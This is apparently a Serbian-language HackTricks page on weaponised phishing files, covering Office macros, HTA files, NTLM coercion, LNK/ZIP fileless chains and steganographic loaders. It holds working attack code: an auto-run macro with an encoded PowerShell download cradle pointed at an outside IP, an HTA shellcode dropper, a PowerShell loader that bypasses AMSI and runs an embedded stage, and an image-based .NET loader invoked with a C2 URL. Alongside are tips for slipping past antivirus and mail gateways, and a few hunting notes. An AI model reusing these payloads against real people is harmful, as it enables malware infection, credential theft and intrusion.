# Phishing datoteke i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word vrši validaciju podataka datoteke pre nego što otvori datoteku. Validacija podataka se vrši kroz identifikaciju strukture podataka, u skladu sa OfficeOpenXML standardom. Ako se pojavi bilo koja greška tokom identifikacije strukture podataka, datoteka koja se analizira neće biti otvorena.

Obično Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati datoteku promenom ekstenzije i i dalje zadržati mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali DOCM fajl preimenovan u RTF biće obrađen od strane Microsoft Word-a i biće sposoban za izvršavanje makroa.\
Ista interna struktura i mehanizmi važe za sav softver Microsoft Office Suite (Excel, PowerPoint etc.).

Možete koristiti sledeću komandu da proverite koje će ekstenzije biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX fajlovi koji referenciraju udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji uključuje macros mogu takođe „izvršavati“ macros.

### Učitavanje eksternih slika

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, i **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti macros za izvršavanje arbitrary code iz dokumenta.

#### Autoload functions

Što su češće, veća je verovatnoća da će ih AV otkriti.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metapodatke

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Radite ovo zato što **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućenog formata **`.docm`** (npr. sličica ima veliki `!` i neki web/email gateway-ovi ih u potpunosti blokiraju). Stoga je ova **stara `.doc` ekstenzija najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA fajlovi

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno pouzdana" aplikacija, bez ograničenja sigurnosnog modela pretraživača.

HTA se izvršava koristeći **`mshta.exe`**, koji je tipično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je on deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Postoji nekoliko načina da **natjerate NTLM autentifikaciju "udaljeno"**, na primer, možete dodati **nevidljive slike** u imejl ili HTML koje će korisnik pristupiti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **okidati** **autentifikaciju** samo za **otvaranje foldera.**

**Pogledajte ove ideje i više na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti heš ili autentifikaciju, već takođe možete **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna mamca dokumenta (PDF/DOCX) i maliciozni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izrezuje i pokreće potpuno u memoriji.

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP u uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i roditeljski direktorijum trenutnog radnog direktorijuma.
2) Pročitaj bajtove ZIP-a i pronađi hardkodirani marker (npr. xFIQCV). Sve posle markera je ugrađeni PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, raspakuj tamo, i otvori mamac .docx da bi izgledalo legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskuj sledeću fazu (npr. ukloni sve # karaktere) i izvrši je u memoriji.

Primer PowerShell skeleta za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Dostava često zloupotrebljava ugledne PaaS poddomene (npr. *.herokuapp.com) i može ograničiti pristup payloads (servirati benigni ZIP na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi se minimizirali artefakti na disku.

Persistencija korišćena u istom lancu
- COM TypeLib hijacking of the Microsoft Web Browser control tako da IE/Explorer ili bilo koja aplikacija koja ga ugradjuje automatski ponovo pokrene payload. Pogledajte detalje i spremne komande ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Lov/IOCs
- ZIP fajlovi koji sadrže ASCII marker string (npr. xFIQCV) prikačeni na podatke arhive.
- .lnk koji enumeriše roditeljske/korisničke foldere da bi locirao ZIP i otvara lažni dokument.
- Manipulacija AMSI putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne konverzacije koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## Payload-i u slikama odvojeni steganografskim delimiterima (PowerShell stager)

Nedavni loader lanci isporučuju obfuskirani JavaScript/VBS koji dešifruje i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-enkodiran .NET DLL sakriven kao običan tekst između jedinstvenih start/end markera. Skript traži ove delimitere (primeri viđeni u prirodi: «<<sudo_png>> … <<sudo_odt>>>»), ekstrahuje tekst između, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznatu entry metodu sa C2 URL-om.

Tok rada
- Faza 1: Archived JS/VBS dropper → dešifruje ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, ekstrahuje Base64 označen markerima, učitava .NET DLL u memoriji i poziva njegovu metodu (npr. VAI) prosleđujući C2 URL i opcije.
- Faza 3: Loader preuzima finalni payload i obično ga injektuje putem process hollowing u pouzdan binarni fajl (često MSBuild.exe). Više o process hollowing i trusted utility proxy execution ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izvlačenje DLL-a iz slike i pozivanje .NET metode u memoriji:

<details>
<summary>PowerShell stego ekstraktor i loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganography/marker-hiding). Markeri variraju između kampanja.
- AMSI/ETW bypass i string deobfuscation se obično primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike zbog poznatih delimitera; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ponavljajuća početna faza je mali, jako‑obfuskovan `.js` ili `.vbs` isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` da bi pokrenuo sledeću fazu preko HTTPS-a.

Skeleton logic (abstract):
- Pročitaj sadržaj sopstvenog fajla
- Pronađi Base64 blob između junk strings
- Dekodiraj u ASCII PowerShell
- Izvrši pomoću `wscript.exe`/`cscript.exe` koji pozivaju `powershell.exe`

Hunting cues
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz korisničkih temp putanja.

## Windows files to steal NTLM hashes

Proverite stranicu o **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
